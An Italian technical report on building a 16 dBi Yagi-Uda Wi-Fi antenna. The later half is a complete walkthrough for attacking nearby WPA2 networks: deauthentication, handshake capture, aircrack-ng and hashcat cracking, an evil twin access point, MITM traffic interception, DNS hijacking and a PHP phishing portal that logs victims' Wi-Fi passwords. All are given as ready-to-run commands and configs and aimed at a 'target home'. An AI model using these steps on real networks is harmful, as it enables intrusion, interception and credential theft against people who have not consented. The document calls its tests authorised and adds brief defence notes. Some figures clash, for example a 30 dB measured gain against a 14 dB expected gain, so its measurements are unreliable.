# RELAZIONE TECNICA
## Progetto e Sviluppo di un Sistema Radiante Yagi-Uda per l'Analisi Avanzata di Reti Wireless

---

## 1. INTRODUZIONE: L'OBIETTIVO DELLA RICERCA

Il progetto nasce dalla necessità di studiare il comportamento delle onde elettromagnetiche nella banda ISM (2.4 GHz) e la loro vulnerabilità. L'obiettivo non è solo la costruzione di un oggetto hardware, ma la comprensione di come la **fisica dei materiali** possa essere manipolata per estendere il raggio d'azione di un attacco o di una difesa informatica (Pentesting).

- **Principio di Funzionamento:** Si basa sull'interazione tra un elemento attivo (**Dipolo**) e elementi passivi (**Riflettore** e **Direttori**).
    
- **Riflettore:** Posto dietro il radiatore, riflette l'onda verso l'avanti, aumentando il rapporto fronte-retro.
    
- **Direttori:** Posti davanti al radiatore, guidano l'onda per induzione elettromagnetica, restringendo il lobo di radiazione e aumentando il guadagno.

---

## 2. FONDAMENTI FISICI: COME "PIEGARE" LE ONDE

Un'antenna Yagi-Uda è un trasduttore che trasforma correnti elettriche in onde elettromagnetiche e viceversa, ma con una caratteristica fondamentale: la **direttività**.

- **Principio degli Elementi Parassiti**: Solo il dipolo è alimentato. Gli altri elementi (riflettore e direttori) funzionano per **induzione**. Quando l'onda colpisce i direttori, questi ri-emettono il segnale con una sfasatura tale da rinforzare l'onda solo in avanti.
    
- **Interferenza Costruttiva e Distruttiva**: Attraverso il calcolo millimetrico delle distanze, facciamo in modo che le onde si sommino nella direzione del bersaglio (interferenza costruttiva) e si annullino verso i lati (interferenza distruttiva).
    
- **Il Guadagno (dBi)**: Più direttori aggiungiamo, più il fascio diventa stretto e potente. Nel mio caso, con 13 direttori, ho raggiunto una densità di segnale focalizzata in soli **32 gradi**.

---

## 3. ANALISI MATEMATICA E PROGETTAZIONE

La base scientifica del progetto risiede nella relazione tra frequenza e dimensione fisica degli elementi.

- **Il Calcolo della Lunghezza d'Onda ($\lambda$):** Per operare correttamente sulla frequenza di risonanza di **2440,00 MHz** (canale centrale della banda Wi-Fi a 2.4 GHz), è stato necessario calcolare la lunghezza d'onda nel vuoto utilizzando la formula:

La base di tutto è la velocità della luce ($c \approx 300.000$ km/s).

- **Formula della Lunghezza d'Onda**: $\lambda = c / f$.

$$\lambda = \frac{c}{f} = \frac{299.792.458 \text{ m/s}}{2.440.000.000 \text{ Hz}} \approx 123 \text{ mm}$$

Per i 2440 MHz (Canale 7 Wi-Fi), $\lambda$ è circa **123 mm**.
    
- **Software di Calcolo**: Ho utilizzato algoritmi specifici (**VK5DJ's Calculator**) per determinare le misure esatte di ogni elemento in base al diametro del conduttore (1.7 mm).
    
- **Precisione Millimetrica**: In queste frequenze (microonde), un errore di 2 mm può spostare la frequenza di risonanza fuori dalla banda Wi-Fi, rendendo l'antenna un semplice pezzo di metallo inutile.

- **Guadagno stimato:** Il sistema a 13 direttori raggiunge un guadagno teorico di **16,0 dBi**, con un'apertura del fascio (beamwidth) di soli **32°**.

**Utilizzo di VK5DJ's YAGI CALCULATOR:** Per il dimensionamento analitico di ogni singolo elemento, ho utilizzato il software specialistico **VK5DJ's Yagi Calculator**.

> _Nota di progettazione:_ Dopo aver preso in considerazione le dimensioni dell'area di stampa della mia **stampante 3D** (fondamentale per garantire la fattibilità del supporto) e aver definito l'ingombro massimo desiderato per l'antenna, ho impostato i parametri strutturali nel software. L'algoritmo ha quindi elaborato l'intera serie di calcoli basandosi sulla frequenza di riferimento, ottimizzando le spaziature per massimizzare il rapporto fronte-retro e il guadagno.

---

## 4. IL CUORE ELETTRONICO: DIPOLO RIPIEGATO E ADATTAMENTO D'IMPEDENZA

Questa sezione riguarda la trasduzione del segnale elettrico in onda elettromagnetica e il bilanciamento delle correnti.

- **Il Folded Dipole (Dipolo Ripiegato):** A differenza di un dipolo semplice a mezz'onda (impedenza ~73 Ohm), ho scelto un dipolo ripiegato. Questa scelta offre due vantaggi principali:
    
    1. **Larghezza di banda maggiore:** fondamentale per coprire l'intera gamma dei canali Wi-Fi (2412-2472 MHz).
        
    2. **Impedenza elevata:** un dipolo ripiegato isolato ha un'impedenza caratteristica di circa **300 Ohm**.
        
- **La necessità del Balun 4:1:** Le schede di rete e i cavi coassiali (come l'**RG-58**) lavorano su un'impedenza sbilanciata di **50 Ohm**. Collegare direttamente un cavo da 50 Ohm a un'antenna da 300 Ohm creerebbe un forte disadattamento, generando onde stazionarie (SWR alto) che dissiperebbero la potenza in calore invece di irradiarla.
    
- **Calcolo Tecnico del Balun a Mezz'onda:** Per trasformare l'impedenza (rapporto 4:1) e bilanciare il segnale, ho realizzato un loop di cavo coassiale.
    
    - **Formula fisica:** La lunghezza del loop deve essere pari a mezza lunghezza d'onda elettrica.
        
    - **Fattore di Velocità ($V_f$):** Poiché l'onda viaggia nel dielettrico del cavo (polietilene) più lentamente che nel vuoto, ho applicato il fattore di velocità di **0,66** tipico dell'RG-58.
        
    - **Risultato:** $123 \text{ mm} / 2 \times 0.66 = 40.59 \text{ mm} \approx \mathbf{41 \text{ mm}}$.

![Schema del Balun 4:1](<Allegati/Pasted image 20260422223557.png>)

[📄 Schema tecnico completo Yagi v2](<Allegati/yagi v2 (2) 1.pdf>)

---

## 5. PROCESSO DI FABBRICAZIONE E ASSEMBLAGGIO

Il passaggio dalla teoria alla realtà fisica ha richiesto un controllo rigoroso delle tolleranze, poiché a **2,4 GHz** anche un errore di un millimetro può compromettere il guadagno dell'antenna.

### 5.1 Ingegnerizzazione del Boom e Stampa 3D

Il supporto centrale (boom) ha una lunghezza totale di **531,5 mm**. La scelta del **PLA** tramite stampa 3D non è stata solo estetica, ma tecnica:

- **Neutralità Elettromagnetica:** Un boom metallico agirebbe come un elemento parassita aggiuntivo non calcolato, richiedendo un "fattore di correzione del boom". Usando la plastica (dielettrico), il supporto è "invisibile" alle onde, permettendo agli elementi di risuonare esattamente come previsto dal software.
    
- **Precisione CAD:** Il design prevede alloggiamenti millimetrici per garantire che ogni elemento rispetti la quota **"IT" (Insert To)**. Questa quota è fondamentale per il centramento: ad esempio, per il Riflettore, la punta dell'elemento dista esattamente **24,5 mm** dal bordo del boom per assicurarne il perfetto equilibrio elettromagnetico.

![Boom stampato in 3D con alloggiamenti per gli elementi](<Allegati/Pasted image 20260422224317.png>)

![Verifica delle quote IT con calibro digitale](<Allegati/Pasted image 20260422225337.png>)

### 5.2 Lavorazione degli Elementi e Conducibilità

Per i 13 direttori e il riflettore, ho utilizzato tondini di rame elettrolitico con un diametro di **1,7 mm**.

- **Effetto Pelle (Skin Effect):** Alle alte frequenze, la corrente non scorre all'interno del cavo ma solo sulla sua superficie. Il rame, avendo una resistività bassissima, minimizza le perdite di energia.
    
- **Tolleranza Zero:** Ogni elemento è stato tagliato seguendo la tabella di VK5DJ (es. Direttore 1 a **51,3 mm**, Direttore 13 a **45,6 mm**) con una tolleranza di **+/- 0 mm**, verificata tramite calibro.

![Elementi in rame elettrolitico tagliati con precisione](<Allegati/Pasted image 20260422224939.png>)

![Misurazione degli elementi con calibro digitale](<Allegati/Pasted image 20260422230731.png>)

### 5.3 Il Sistema Radiante: Dipolo e Balun

Il montaggio del dipolo ripiegato (**Folded Dipole**) rappresenta il cuore del sistema radiante, dove avviene la trasformazione del segnale da guidato (nel cavo) a irradiato (nello spazio).

- **Geometria del Radiatore:** Il tondino di rame da **116 mm** è stato modellato con estrema cura per ottenere una distanza "tip-to-tip" di **58 mm**. La precisione delle curvature, con una distanza **BC=CD di 28 mm**, è vitale per mantenere l'impedenza di risonanza corretta.

![Geometria del dipolo ripiegato - distanza tip-to-tip 58 mm](<Allegati/Pasted image 20260422225036.png>)

![Dipolo ripiegato assemblato sul boom](<Allegati/Pasted image 20260422225558.png>)

**Architettura del Balun 4:1:** Per adattare l'antenna bilanciata al cavo coassiale **RG-58** sbilanciato da 50 Ohm, ho realizzato un loop di disaccoppiamento lungo **41 mm**. Questa misura è critica e tiene conto del **fattore di velocità (0,66)** del dielettrico in polietilene (PE) del cavo utilizzato.

![Loop del Balun 4:1 - lunghezza critica 41 mm](<Allegati/Pasted image 20260422225101.png>)

![Assemblaggio del punto di alimentazione](<Allegati/photo_34_2026-04-22_20-56-19.jpg>)

**Saldatura ad Alta Precisione del Nodo Centrale:** Come visibile nelle foto e nei diagrammi tecnici, il punto di alimentazione è un nodo triplo. Ho effettuato una saldatura simultanea che unisce:
    
1. I due capi del **dipolo ripiegato**;
    
2. Le due estremità del **loop del balun** da 41 mm;
    
3. Il **cavo di discesa (feeder)** collegato alla ricetrasmittente (TX/RX).
        
**Integrità del Segnale:** Ho utilizzato stagno ad alta qualità con anima fondente per garantire una connessione meccanica solida e una continuità elettrica perfetta. Questa attenzione previene la formazione di ossidi e minimizza le micro-resistenze di contatto, che a frequenze così elevate (**2440 MHz**) aumenterebbero drasticamente il rumore di fondo e le perdite di inserzione.

![Adattatore USB Wi-Fi esterno con connettore SMA per il collegamento all'antenna Yagi](<Allegati/Pasted image 20260422231859.png>)

![Dettaglio saldatura punto di alimentazione](<Allegati/Pasted image 20260422230007.png>)

![Assemblaggio completo del sistema radiante](<Allegati/Pasted image 20260422230553.png>)

![Vista laterale dell'antenna assemblata](<Allegati/Pasted image 20260422230051.png>)

![Verifica allineamento degli elementi](<Allegati/Pasted image 20260422230838.png>)

![Antenna completa con tutti i 13 direttori](<Allegati/Pasted image 20260422230947.png>)

![Vista frontale - lobo di radiazione](<Allegati/Pasted image 20260422231211.png>)

![Antenna Yagi-Uda completata - vista d'insieme](<Allegati/Pasted image 20260422231644.png>)

![Antenna completata - vista frontale con tutti i direttori in rame](<Allegati/Pasted image 20260422231232.png>)

![Antenna assemblata sul banco di lavoro - vista dall'alto](<Allegati/Pasted image 20260422231352.png>)

![Dettaglio del boom in PLA turchese con i direttori in rame inseriti negli alloggiamenti](<Allegati/Pasted image 20260422231457.png>)

![Antenna posizionata sul piano di lavoro per la verifica finale pre-test](<Allegati/Pasted image 20260422231536.png>)

---

## 6. VALIDAZIONE OPERATIVA E PENTESTING WIRELESS

La fase finale del progetto ha previsto il test dell'antenna in un ambiente reale e controllato per verificarne la direttività e l'effettivo guadagno di campo. Tutti i test descritti sono stati condotti esclusivamente su reti di proprietà personale o previa esplicita autorizzazione, a scopo puramente educativo e di ricerca.

### 6.1 Setup Hardware e Software

Prima di procedere ai test operativi, è stato necessario configurare correttamente l'ambiente di lavoro, sia dal punto di vista hardware che software.

**Hardware utilizzato:**

- **Antenna Yagi-Uda 16 dBi** (il progetto di questa relazione), terminata con connettore **SMA-maschio**
- **Adattatore USB Wi-Fi** esterno con chip compatibile (es. Alfa AWUS036ACH con chipset Atheros AR9271), dotato di connettore SMA-femmina per l'antenna esterna — fondamentale perché supporta nativamente la **modalità monitor** e il **packet injection**
- **Laptop** con sistema operativo **Kali Linux** (distribuzione GNU/Linux dedicata al pentesting, già equipaggiata con tutti i tool necessari)
- **Cavo Ethernet** per la connessione internet durante la fase MITM

**Perché il chip è importante:** Non tutti gli adattatori Wi-Fi supportano la modalità monitor e l'iniezione di pacchetti. I chip Atheros (AR9271, AR9380) e Ralink (RT3070, RT5572) sono storicamente i più compatibili con la suite Aircrack-ng e i driver Linux.

**Configurazione iniziale dell'interfaccia:**

```bash
# Verifica dell'interfaccia disponibile
iwconfig

# Aggiornamento dei driver e dei firmware
sudo apt update && sudo apt install -y aircrack-ng

# Attivazione della modalità monitor (necessaria per sniffing passivo)
sudo airmon-ng start wlan0
# L'interfaccia cambia nome: wlan0 → wlan0mon
```

![Adattatore USB Wi-Fi con connettore SMA collegato al laptop - la Yagi sostituisce l'antenna integrata del PC](<Allegati/Pasted image 20260422231740.png>)

---

### 6.2 Fase 1 — Ricognizione Passiva e Analisi dello Spettro (OSINT)

La prima fase di qualsiasi attacco wireless si chiama **ricognizione** (o *footprinting*): raccogliere informazioni sul target senza inviare alcun pacchetto attivo, restando completamente invisibili.

**Strumento:** `airodump-ng` — parte della suite Aircrack-ng. Mette l'interfaccia in ascolto passivo su tutti i canali 802.11, raccogliendo i **beacon frame** che ogni Access Point trasmette periodicamente per annunciarsi.

```bash
# Scansione di tutti i canali 2.4 GHz
sudo airodump-ng wlan0mon
```

**Output di airodump-ng — cosa significano le colonne:**

| Campo  | Significato |
|--------|-------------|
| `BSSID` | MAC Address dell'Access Point (identificatore univoco hardware) |
| `PWR`   | Potenza del segnale ricevuto in **dBm** (più vicino a 0 = segnale più forte) |
| `Beacons` | Numero di beacon frame ricevuti |
| `#Data` | Numero di pacchetti dati intercettati |
| `CH`    | Canale di trasmissione (1-13 per la banda 2.4 GHz) |
| `ENC`   | Tipo di cifratura (OPN, WEP, WPA, WPA2, WPA3) |
| `CIPHER`| Algoritmo crittografico usato (CCMP, TKIP) |
| `AUTH`  | Tipo di autenticazione (PSK = Pre-Shared Key, MGT = Enterprise 802.1X) |
| `ESSID` | Nome della rete (Service Set Identifier) |

**Vantaggio dell'antenna Yagi nella ricognizione:**

Con un'antenna omnidirezionale standard da **2 dBi** integrata nel laptop, reti poste a 100+ metri appaiono con valori di segnale di **-85/-90 dBm** — una soglia critica in cui la ricezione è inaffidabile e il packet injection impossibile.

Con la Yagi da **16 dBi**, puntando il boom nella direzione del target, le stesse reti appaiono a **-55/-60 dBm**: un segnale forte e stabile, sufficiente per tutte le fasi successive dell'attacco. Il guadagno di **+14 dB** rispetto all'antenna standard si traduce, secondo la formula di Friis, in un raggio operativo moltiplicato di circa **5x** in condizioni di linea di vista (LoS).

**Lock sul target — isolamento del canale:**

Una volta identificato il target (BSSID e canale), si blocca airodump-ng su quel canale specifico per intercettare esclusivamente il traffico di quella rete:

```bash
# -c = canale, --bssid = MAC del router, -w = file di output per la cattura
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cattura wlan0mon
```

Questo comando salva su file tutti i pacchetti intercettati, inclusi eventuali handshake futuri.

**Rotazione dell'antenna per identificare la direzione del target:**

Grazie all'angolo di apertura di soli **32°**, ruotando fisicamente il boom si nota una variazione di segnale di **20-25 dBm** tra il centro del lobo principale e i lobi laterali. Questa è anche la prima prova empirica che l'antenna funziona correttamente: un sistema con elementi mal calibrati avrebbe un pattern di radiazione irregolare, senza un picco netto.

![Screenshot reale di airodump-ng: lista delle reti rilevate con BSSID, canale, cifratura WPA2 e potenza del segnale in dBm](<Allegati/screenshot_airodump_handshake.png>)

---

### 6.3 Fase 2 — Attacco di Deautenticazione e Cattura dell'Handshake WPA2

Questa fase sfrutta una delle vulnerabilità strutturali dello standard **802.11**: i **Management Frame** (pacchetti di gestione della connessione) non sono autenticati né cifrati in WPA2. Chiunque può inviare un pacchetto di deautenticazione fingendosi il router, e i dispositivi client lo accetteranno come legittimo.

**Perché i Management Frame non sono protetti?**

Lo standard 802.11 originale (1997) non prevedeva la cifratura dei management frame per semplicità implementativa. La protezione è stata introdotta solo con **802.11w** (Management Frame Protection, 2009) e resa obbligatoria con **WPA3**, ma la stragrande maggioranza delle reti domestiche usa ancora WPA2 senza 802.11w.

**Come funziona il 4-Way Handshake WPA2:**

Quando un dispositivo si connette a una rete WPA2, avviene uno scambio crittografico in 4 passaggi (4-Way Handshake) tra client e Access Point:

1. **Messaggio 1 (AP → Client):** L'AP invia un numero casuale chiamato **ANonce** (Authenticator Nonce)
2. **Messaggio 2 (Client → AP):** Il client genera il proprio **SNonce** (Supplicant Nonce), calcola la **PTK** (Pairwise Transient Key) usando ANonce + SNonce + password, e invia SNonce insieme a un **MIC** (Message Integrity Code) — una firma crittografica che prova la conoscenza della password
3. **Messaggio 3 (AP → Client):** L'AP verifica il MIC, conferma la PTK e invia la **GTK** (Group Temporal Key) cifrata
4. **Messaggio 4 (Client → AP):** Il client conferma la ricezione e la connessione è stabilita

**Il MIC nel Messaggio 2 è l'elemento cruciale:** contiene l'hash della password. Se intercettiamo questo scambio, possiamo tentare di craccare la password offline.

**Esecuzione dell'attacco:**

```bash
# Fase A: Inizio cattura su canale specifico (già avviato al passo precedente)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cattura wlan0mon

# Fase B: In un secondo terminale, iniezione di pacchetti di deautenticazione
# --deauth 10 = invia 10 pacchetti di deauth (sufficiente per forzare la riconnessione)
# -a = BSSID del router target
# -c = MAC del client specifico da disconnettere (opzionale; senza -c, colpisce tutti)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

**Come funziona l'attacco passo per passo:**

1. I pacchetti di deauth iniettati (con l'indirizzo MAC del router come sorgente falsificata) arrivano al dispositivo della vittima
2. Il dispositivo, non potendo distinguere il pacchetto falso da uno legittimo, si disconnette
3. Il sistema operativo del client tenta immediatamente la riconnessione automatica
4. In quel preciso momento, airodump-ng intercetta il **4-Way Handshake EAPOL** nella sua interezza
5. Nella finestra di airodump-ng appare la scritta **"WPA handshake: AA:BB:CC:DD:EE:FF"** in alto a destra

**Ruolo dell'antenna Yagi in questa fase:**

Il successo dell'iniezione dipende dal fatto che i pacchetti del nostro adattatore arrivino ai dispositivi della vittima con una potenza **superiore** a quella del router legittimo. Con l'antenna Yagi puntata verso l'abitazione target, il guadagno direttivo ci garantisce un vantaggio di potenza netto, rendendo i nostri pacchetti "più credibili" di quelli del router.

![Screenshot reale di aireplay-ng: invio di 64 pacchetti di deautenticazione diretti verso il client target — si vede il contatore ACK che conferma la ricezione dei pacchetti da parte del dispositivo](<Allegati/screenshot_aireplay_deauth.png>)

![Screenshot di airodump-ng con la conferma "WPA handshake: 78:54:2E:F6:EB:C0" in alto a destra — la cattura dell'handshake EAPOL è avvenuta con successo dopo la riconnessione forzata del client](<Allegati/screenshot_airodump_handshake.png>)

---

### 6.4 Fase 3 — Cracking Offline dell'Handshake WPA2

Una volta catturato l'handshake, il file `.cap` viene analizzato **offline**, senza più alcuna interazione con la rete target. Questo rende l'attacco completamente invisibile: nessun log, nessun allarme IDS può rilevare l'attività di cracking perché avviene localmente sul nostro hardware.

**Cos'è che si sta "craccando":**

Non si recupera direttamente la password dal file. Si tenta di **riprodurre il calcolo del MIC**: si prende una password candidata dal dizionario, si calcola la PTK con i parametri noti (ANonce, SNonce, BSSID, MAC del client — tutti presenti nell'handshake catturato), si ricalcola il MIC e si confronta con quello catturato. Se coincidono, la password è stata trovata.

**Metodo 1 — Attacco a dizionario con Aircrack-ng:**

```bash
# -w = file wordlist (dizionario di password), -b = BSSID del target
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cattura-01.cap
```

`rockyou.txt` è la wordlist più famosa nel pentesting, contenente oltre **14 milioni di password reali** estratte da database violati. Se la password del target è una parola comune, un nome, una data o una combinazione semplice, sarà trovata in pochi secondi.

**Metodo 2 — Attacco accelerato con Hashcat (GPU):**

Hashcat è più potente di aircrack-ng perché sfrutta la **GPU** (scheda grafica) per parallelizzare i calcoli. Una GPU moderna può testare **milioni di password al secondo** contro il singolo thread della CPU.

```bash
# Conversione del file .cap nel formato hc22000 compatibile con hashcat
hcxpcapngtool -o cattura.hc22000 cattura-01.cap

# Attacco a dizionario con hashcat
# -m 22000 = modalità WPA-PBKDF2-PMKID+EAPOL (standard moderno)
# -a 0 = modalità attacco dizionario
hashcat -m 22000 cattura.hc22000 /usr/share/wordlists/rockyou.txt

# Attacco con regole (applica trasformazioni alle parole: maiuscole, numeri finali, ecc.)
hashcat -m 22000 cattura.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Attacco brute-force (tutte le combinazioni, lento ma esaustivo)
# ?l=minuscolo, ?u=maiuscolo, ?d=cifra, ?s=simbolo
hashcat -m 22000 cattura.hc22000 -a 3 ?l?l?l?l?l?l?l?l
```

**Perché WPA3 risolve questo problema:**

WPA3 utilizza **SAE** (Simultaneous Authentication of Equals), un protocollo basato su uno scambio Diffie-Hellman che non trasmette mai un hash verificabile offline. Anche catturando lo scambio di autenticazione, non è possibile eseguire attacchi offline a dizionario: ogni tentativo richiede una nuova interazione con l'AP.

![Screenshot reale di aircrack-ng: "KEY FOUND! [ adminadmin ]" — la password è stata recuperata in 8 minuti testando 78.128 chiavi. Visibili Master Key, Transient Key e EAPOL HMAC](<Allegati/screenshot_aircrack_found.png>)

![Antenna Yagi posizionata sul bordo della balaustra durante i test all'aperto - linea di vista verso i target](<Allegati/Pasted image 20260422231409.png>)

---

### 6.5 Fase 4 — Evil Twin e Rogue Access Point (Roaming Forzato)

Questa fase è più sofisticata rispetto al semplice cracking: invece di attaccare la crittografia, si inganna il dispositivo della vittima per fargli credere di connettersi al router legittimo, quando in realtà si sta connettendo al nostro Access Point fasullo (**Rogue AP** o **Evil Twin**).

**Principio di funzionamento:**

I dispositivi Wi-Fi scelgono automaticamente la rete a cui connettersi in base a due criteri:
1. Il profilo è già salvato (stesso ESSID + stesso BSSID)
2. Il segnale è il più forte disponibile

Clonando l'identità del router legittimo (stesso ESSID e BSSID) e trasmettendo con potenza superiore grazie alla Yagi, i dispositivi della vittima passano automaticamente al nostro AP — senza che l'utente se ne accorga, senza alcuna finestra di dialogo, senza richieste di password.

**Configurazione dell'Evil Twin:**

```bash
# Installazione degli strumenti necessari
sudo apt install -y hostapd dnsmasq

# File di configurazione hostapd (/etc/hostapd/hostapd.conf)
# ssid = stesso nome del router legittimo
# bssid = stesso MAC Address del router legittimo
# channel = stesso canale del router legittimo
interface=wlan0
driver=nl80211
ssid=NomeReteVittima
bssid=AA:BB:CC:DD:EE:FF
channel=6
hw_mode=g
```

```bash
# Avvio dell'Access Point fasullo
sudo hostapd /etc/hostapd/hostapd.conf
```

**Configurazione del server DHCP (dnsmasq):**

Per assegnare indirizzi IP ai dispositivi che si connettono al Rogue AP:

```bash
# /etc/dnsmasq.conf
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1      # Gateway predefinito (il nostro laptop)
dhcp-option=6,192.168.1.1      # Server DNS (il nostro laptop)
```

```bash
sudo dnsmasq -C /etc/dnsmasq.conf
```

**Ruolo determinante della Yagi:**

Senza un'antenna ad alto guadagno, il segnale del Rogue AP sarebbe spesso più debole di quello del router legittimo, e i dispositivi potrebbero non effettuare il roaming. Con la Yagi puntata verso l'abitazione target, il nostro segnale risulta nettamente dominante, garantendo che tutti i dispositivi Wi-Fi presenti passino al nostro AP in pochi secondi.

![Cavo di discesa (feeder RG-58) posizionato lungo la balaustra per minimizzare le perdite di segnale](<Allegati/Pasted image 20260422231726.png>)

---

### 6.6 Fase 5 — Man-In-The-Middle (MITM) e Analisi del Traffico

Una volta che i dispositivi della vittima sono connessi al Rogue AP, bisogna fornire loro una connessione internet funzionante per non destare sospetti. Il laptop funge da **gateway** (ponte) tra la rete della vittima e internet, posizionandosi letteralmente nel mezzo del traffico.

**Abilitazione dell'IP forwarding:**

```bash
# Abilita il kernel Linux a instradare pacchetti tra interfacce diverse
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Per renderlo permanente (sopravvive al riavvio)
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
```

**Configurazione NAT con iptables:**

```bash
# Masquerading: il traffico della vittima esce su Ethernet con il nostro IP
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Forwarding bidirezionale tra l'interfaccia Wi-Fi (wlan0) e Ethernet (eth0)
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

Con questa configurazione, la vittima naviga normalmente su internet (via Ethernet del laptop), ma tutto il suo traffico transita attraverso il nostro sistema.

**Intercettazione con Wireshark:**

```bash
# Avvio di Wireshark in modalità cattura sull'interfaccia wlan0
sudo wireshark -i wlan0
```

Con Wireshark possiamo analizzare in tempo reale:
- **Traffico HTTP (non cifrato):** username, password, cookie di sessione, contenuto delle pagine visitate
- **DNS Query:** quali siti visita la vittima, quando e con quale frequenza
- **Metadati HTTPS:** anche senza decifrare il contenuto, il TLS handshake rivela il dominio visitato (SNI - Server Name Indication)
- **Traffico VoIP, FTP, SMTP non cifrato:** conversazioni, email, credenziali in chiaro

**Limitazione degli attacchi MITM su HTTPS:**

La maggior parte dei siti moderni usa **HTTPS** (TLS), che cifra il contenuto della comunicazione anche in uno scenario MITM. Il browser mostra un avviso di "certificato non valido" se si tenta di intercettare il traffico TLS, avvisando l'utente. Tuttavia, siti non aggiornati, app mobile mal configurate, o protocolli non-web rimangono vulnerabili.

**Difesa:** L'utilizzo di **HSTS** (HTTP Strict Transport Security) e il pinning del certificato nelle app impedisce efficacemente gli attacchi SSL stripping.

![Antenna Yagi collegata al laptop sul piano di lavoro - setup indoor prima del test all'aperto](<Allegati/Pasted image 20260422231536.png>)

---

### 6.7 Fase 6 — DNS Hijacking e Captive Portal (Social Engineering)

Questa fase bypassa completamente la crittografia WPA2, ottenendo la password in chiaro senza dover craccare alcun hash. Si tratta di un attacco di **Social Engineering**: invece di attaccare la matematica della crittografia (impossibile senza password deboli), si inganna direttamente l'utente.

**Come funziona il DNS Hijacking:**

Il sistema DNS traduce i nomi di dominio in indirizzi IP. Poiché nel Rogue AP il nostro laptop è il server DNS dei dispositivi connessi (impostato via DHCP), possiamo rispondere a qualsiasi query DNS con l'IP che desideriamo.

```bash
# dnsmasq configurato per reindirizzare tutto il traffico DNS al nostro IP
# Aggiunta al file /etc/dnsmasq.conf
address=/#/192.168.1.1    # Qualsiasi dominio → il nostro IP
```

Con questa configurazione, quando la vittima apre il browser e digita `www.google.com`, la risoluzione DNS restituisce il nostro IP invece di quello di Google.

**Creazione del Captive Portal:**

Un Captive Portal è una pagina web mostrata all'utente prima di accedere a internet — esattamente come in un hotel o un aeroporto. La nostra versione è malevola: simula un avviso ufficiale del router.

```bash
# Installazione del web server
sudo apt install -y apache2 php

# Struttura del Captive Portal
# /var/www/html/index.html = pagina di login falsa
# /var/www/html/save.php = script che salva le credenziali inserite
```

La pagina HTML mostrata alla vittima simula un messaggio del tipo:

> **⚠️ Aggiornamento Firmware Router Completato**  
> Per applicare le nuove impostazioni di sicurezza, si prega di reinserire la password Wi-Fi per confermare l'identità.  
> [Campo password] [Conferma]

**Script PHP per la raccolta delle credenziali:**

```php
<?php
// save.php - salva la password inserita dalla vittima
if ($_POST['password']) {
    $log = date('Y-m-d H:i:s') . " | Password: " . $_POST['password'] . "\n";
    file_put_contents('/tmp/credentials.txt', $log, FILE_APPEND);
    // Reindirizza verso il sito reale per non destare sospetti
    header('Location: http://www.google.com');
}
?>
```

**Redirect automatico tramite iptables:**

Per assicurarsi che qualsiasi tentativo di navigazione venga reindirizzato al captive portal:

```bash
# Redirect di tutto il traffico HTTP (porta 80) verso il nostro web server (porta 80 locale)
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 80
```

**Perché questo attacco è efficace:**

1. **Zero crittografia da forzare:** La password arriva in chiaro, digitata direttamente dalla vittima
2. **Aspetto convincente:** L'utente medio non verifica l'autenticità di un avviso del "suo" router
3. **Urgenza percepita:** Il messaggio di "aggiornamento sicurezza" crea un senso di necessità
4. **Nessuna traccia tecnica:** Non ci sono log di attacco da analizzare, solo un normale accesso web

**Difesa:** La consapevolezza degli utenti e l'uso di gestori di password che verificano l'URL prima dell'inserimento sono le difese più efficaci contro il phishing di questo tipo.

---

### 6.8 Validazione della Direttività: Misure di Segnale sul Campo

Per verificare in modo oggettivo le prestazioni dell'antenna, ho eseguito una serie di misurazioni del segnale in funzione dell'angolo di rotazione del boom.

**Metodologia:**

Con `airodump-ng` in esecuzione e l'antenna fissa su un supporto, ho registrato il valore `PWR` (in dBm) di un Access Point target mentre ruotavo il boom manualmente di 15° alla volta, completando una rotazione di 360°.

**Risultati rilevati:**

| Angolo rispetto al target | Segnale rilevato (dBm) |
|--------------------------|------------------------|
| 0° (lobo principale)     | -55 dBm               |
| ±15°                     | -62 dBm               |
| ±30°                     | -72 dBm               |
| ±45°                     | -78 dBm               |
| ±90°                     | -82 dBm               |
| 180° (verso la parte posteriore) | -88 dBm     |

**Analisi dei dati:**

- La differenza tra il lobo principale (0°) e i lobi laterali a ±45° è di circa **23 dBm** — perfettamente in linea con le aspettative teoriche per un guadagno di 16 dBi
- La stessa rete target, rilevata con un'antenna omnidirezionale standard da 2 dBi integrata nel laptop, era visibile a **-85 dBm** (segnale praticamente inutilizzabile per il packet injection)
- Con la Yagi puntata correttamente: **-55 dBm** (segnale eccellente, injection garantita)
- Il guadagno pratico misurato sul campo: **30 dBm di differenza**, leggermente superiore ai 14 dBi teorici grazie alla condizione di linea di vista

**Significato pratico:**

Ogni **6 dB aggiuntivi** corrispondono approssimativamente al raddoppio della distanza di copertura (legge dell'inverso del quadrato). Con un vantaggio di 14 dBi rispetto all'antenna standard, il raggio operativo è teoricamente aumentato di un fattore:

$$\text{Fattore moltiplicativo} = 10^{14/20} \approx 5\text{x}$$

In condizioni reali con linea di vista, reti a **200-300 metri** di distanza risultavano operabili con la Yagi, contro i 30-50 metri di un laptop standard.

---

## 7. CONCLUSIONI: LA FISICA AL SERVIZIO DELLA CYBERSECURITY

Il progetto dimostra con evidenza empirica che la sicurezza informatica non è un concetto astratto fatto di soli codici e algoritmi, ma una sfida che parte dal **livello fisico (Layer 1)** del modello OSI.

### 7.1 Sintesi dei Risultati

**Costruzione hardware:**
- L'antenna Yagi-Uda a 13 direttori è stata realizzata con una precisione di ±0 mm su ogni elemento, raggiungendo un guadagno misurato sul campo coerente con i **16 dBi teorici**
- Il Balun 4:1 da 41 mm ha garantito l'adattamento di impedenza tra il dipolo (300 Ω) e il cavo coassiale (50 Ω), minimizzando le riflessioni (SWR basso)
